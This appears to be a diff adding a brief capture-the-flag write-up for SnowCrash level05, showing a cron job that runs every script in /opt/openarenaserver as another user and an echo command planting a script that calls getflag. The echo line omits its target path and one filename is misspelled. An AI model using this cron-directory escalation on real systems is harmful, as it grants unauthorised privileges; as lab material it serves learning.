@@ -1,0 +1,11 @@
+```
+You have new mail.
+level05@SnowCrash:~$ cat /var/spool/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+Cron may be executing /usr/sbin/openarenaservec script
+
+openarenaserver executes all scripts in /opt/openarenaserver
+
+`echo "#!/bin/sh\ngetflag > /tmp/flag"` and we wait 2 minutes. Then our flag is written in /tmp/flag
